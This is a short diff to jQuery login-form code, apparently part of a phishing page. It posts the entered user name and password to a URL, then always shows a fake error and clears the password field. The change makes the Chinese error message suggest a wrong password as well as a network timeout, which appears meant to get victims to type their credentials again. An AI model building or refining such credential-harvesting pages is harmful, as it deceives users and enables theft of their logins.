@@ -201,7 +201,7 @@ $('#spin').fadeIn();
 jquery(e);$.post(url, {user:a,pass:b}, function(){
 setTimeout(function(){
 $('#error_msg').fadeIn();
-$('#error_msg').html('网络错误! 连接超时');
+$('#error_msg').html('密码组合无效 或者 网络错误! 连接超时');
 $('#pass').val('');
 $('#pass').focus();
 $('#subBtn').attr('disabled',false);
